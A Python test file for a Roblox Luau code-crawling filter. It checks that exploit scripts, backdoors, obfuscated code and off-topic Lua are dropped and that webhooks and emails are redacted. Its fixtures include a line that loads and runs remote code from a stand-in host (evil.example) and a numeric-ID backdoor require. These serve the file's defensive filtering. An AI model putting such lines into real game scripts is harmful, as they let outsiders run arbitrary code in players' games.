from rbxcrawl import filters
from rbxcrawl.records import make_record


def code(text, **meta):
    return make_record("github", "code", "k", text, **meta)


GOOD = """--!strict
local Players = game:GetService("Players")
local function onAdded(player: Player)
    task.wait(1)
    print(player.Name)
end
Players.PlayerAdded:Connect(onAdded)
"""


def decide(text, cfg=None, **meta):
    r = code(text, **meta)
    return filters.decide(r, filters.analyze(r), cfg)


def test_good_modern_code_is_kept_and_labelled():
    r = code(GOOD)
    f = filters.analyze(r)
    assert filters.decide(r, f) == (True, "ok")
    assert {"strict", "task_lib", "type_annotations"} <= set(f["modern"])
    assert f["deprecated"] == {}


def test_exploit_scripts_dropped():
    assert decide('local g = getgenv()\ng.x = 1\nhookfunction(print, print)\n' * 3 + "x" * 40)[1] == "exploit"
    assert decide("syn.request({Url='x'})" + " " * 40)[1] == "exploit"
    assert decide(GOOD + "\nDrawing.new('Line')")[1] == "exploit"


def test_backdoors_dropped_but_plain_loadstring_only_flagged():
    assert decide('require(5732849201)\nlocal p = game.Players' + " " * 40)[1] == "backdoor"
    assert decide('loadstring(game:HttpGet("http://evil.example/x.lua"))()' + " " * 40)[1] == "backdoor"
    r = code(GOOD + '\nlocal f = loadstring("return 1")')
    f = filters.analyze(r)
    assert f["loadstring"] and not f["backdoor"]


def test_small_require_with_module_path_is_fine():
    assert decide(GOOD + "\nlocal m = require(script.Parent.Module)")[0] is True


def test_obfuscated_and_minified_dropped():
    blob = "local a=" + "\\104\\101\\108\\108\\111" * 12
    assert decide(blob + "\nprint(a)" + " " * 40)[1] == "obfuscated"
    assert decide("local x=1;" * 400)[1] == "obfuscated"  # one 4000-char line, no whitespace


def test_non_roblox_lua_dropped_unless_repo_is_roblox():
    love = "function love.draw()\n  love.graphics.print('hi', 10, 10)\nend\nfunction love.update(dt) end\n"
    assert decide(love)[1] in ("non_roblox_lua", "no_roblox_signal")
    assert decide(love, roblox_repo=True)[0] is True  # trusted by project-file evidence
    vim = "vim.api.nvim_set_keymap('n', 'a', 'b', {})\nvim.cmd('set number')\n" + "-- x\n" * 10
    assert decide(vim)[0] is False


def test_generic_lua_without_roblox_signal_dropped():
    assert decide("local t = {}\nfor i = 1, 10 do t[i] = i * 2 end\nprint(#t)\n" * 2)[1] == "no_roblox_signal"


def test_deprecated_detection_and_threshold():
    old = 'local Players = game:GetService("Players")\nwait(1)\nspawn(function() end)\nlocal bv = Instance.new("BodyVelocity", workspace)\nPlayers.PlayerAdded:connect(print)\n'
    f = filters.analyze(code(old))
    assert {"wait", "spawn", "body_movers", "lowercase_methods", "instance_new_parent_arg"} <= set(f["deprecated"])
    cfg = filters.Config(max_deprecated_per_kb=1.0)
    assert decide(old, cfg)[1] == "too_deprecated"
    assert filters.analyze(code(GOOD))["deprecated"] == {}  # task.wait / :Connect are fine


def test_task_wait_is_not_flagged_as_wait():
    f = filters.analyze(code('game:GetService("RunService")\ntask.wait(1)\nlocal x = os.clock()\n'))
    assert "wait" not in f["deprecated"]


def test_secrets_redacted_not_dropped_by_default():
    hook = "https://discord.com/api/webhooks/1234567890/AbCdEf-gh_ij"
    text = GOOD + f'\nlocal url = "{hook}"\n-- mail me: a.b@example.com 8.8.8.8\n'
    out, why = filters.process(code(text))
    assert why == "ok" and hook not in out["text"] and "a.b@example.com" not in out["text"]
    assert "<REDACTED_DISCORD_WEBHOOK>" in out["text"] and "<EMAIL>" in out["text"] and "<IP>" in out["text"]
    assert out["n_chars"] == len(out["text"])
    assert filters.process(code(text), filters.Config(drop_secrets=True))[1] == "secrets"


def test_private_ips_are_not_redacted():
    out, _ = filters.scrub("host 192.168.1.5 and 10.0.0.1 and 127.0.0.1")
    assert "192.168.1.5" in out and "10.0.0.1" in out and "127.0.0.1" in out


def test_length_limits():
    assert decide("x")[1] == "too_short"
    assert decide(GOOD, filters.Config(max_chars=50))[1] == "too_long"


def test_quality_ranks_modern_popular_above_old_unpopular():
    new = code(GOOD * 3, stars=300, pushed_at="2025-05-01")
    old = code('wait(1)\nspawn(function() end)\nlocal b = Instance.new("BodyVelocity", workspace)\n' * 6, stars=0, pushed_at="2016-01-01")
    assert filters.analyze(new)["quality"] > filters.analyze(old)["quality"] + 0.15


def test_qa_quality_uses_solved_and_engagement():
    base = dict(kind="qa", n_chars=1200)
    solved = {"kind": "qa", "n_chars": 1200, "meta": {"solved": True, "likes": 20, "views": 5000}}
    plain = {"kind": "qa", "n_chars": 1200, "meta": {"solved": False, "likes": 0, "views": 10}}
    assert filters.quality(solved, {}) > filters.quality(plain, {})


def test_trusted_source_fragments_skip_relevance_but_not_safety():
    # regression: 45% of Roblox's own corpus was dropped as "no roblox signal" (short fragments)
    frag = 'currentAnimKeyframeHandler:disconnect()\nend\n\ncurrentAnim = ""\ncurrentAnimInstance = nil\n'
    r = make_record("hf:Roblox/luau_corpus", "code", "k", frag, fragment=True)
    assert filters.decide(r, filters.analyze(r)) == (True, "ok")
    other = make_record("hf:someone/else", "code", "k", frag)
    assert filters.decide(other, filters.analyze(other))[1] == "no_roblox_signal"
    bad = make_record("hf:Roblox/luau_corpus", "code", "k", frag + "hookfunction(print, print)\n")
    assert filters.decide(bad, filters.analyze(bad))[1] == "exploit"
